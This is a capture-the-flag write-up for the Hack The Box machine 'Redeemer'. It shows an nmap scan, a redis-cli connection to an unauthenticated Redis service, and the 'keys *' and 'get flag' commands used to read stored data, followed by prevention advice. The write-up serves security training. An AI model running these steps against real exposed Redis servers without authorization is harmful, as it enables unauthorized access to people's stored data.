#  Redeemer — Hack The Box

---

## 🧾 Machine Information

| Field      | Value    |
| ---------- | -------- |
| Name       | Redeemer |
| Difficulty | Easy     |
| OS         | Linux    |

---

##  Objective

Identify exposed services and extract sensitive data from misconfigured systems.

---

## Methodology

Recon → Enumeration → Exploitation → Flag Retrieval

---

##  Reconnaissance

###  Nmap Scan

```bash id="9q4r6m"
nmap -sC -sV -oN nmap_initial <TARGET_IP>
```

### 🧾 Key Findings

```text id="kz4h7y"
6379/tcp open  redis
```

###  Insight

* Redis service exposed
* Often misconfigured without authentication

---

##  Redis Enumeration

Connect to Redis:

```bash id="n3o4wp"
redis-cli -h <TARGET_IP>
```

Test connection:

```bash id="x6t9ab"
ping
```

Expected response:

```text id="k5n1qw"
PONG
```

---

##  Initial Access

Retrieve stored keys:

```bash id="2m3b7c"
keys *
```

### Keys Found

* `flag`

Get value:

```bash id="f9v2hx"
get flag
```

---

##  Flag

```text id="v8k3ps"
HTB{...}
```

---

##  Key Learnings

* Redis should not be exposed publicly without authentication
* Misconfigured databases can leak sensitive data
* Always enumerate available keys

---

##  Tools Used

* Nmap
* redis-cli

---

## Attack Timeline

| Phase        | Time   |
| ------------ | ------ |
| Recon        | 10 min |
| Enumeration  | 10 min |
| Exploitation | 5 min  |

**Total:** ~25 minutes

---

## Prevention

* Enable Redis authentication
* Bind Redis to localhost
* Use firewall rules to restrict access

---

## Summary

This machine highlights how **unauthenticated Redis access** can lead to direct data exposure without complex exploitation.

---
 For educational purposes only.
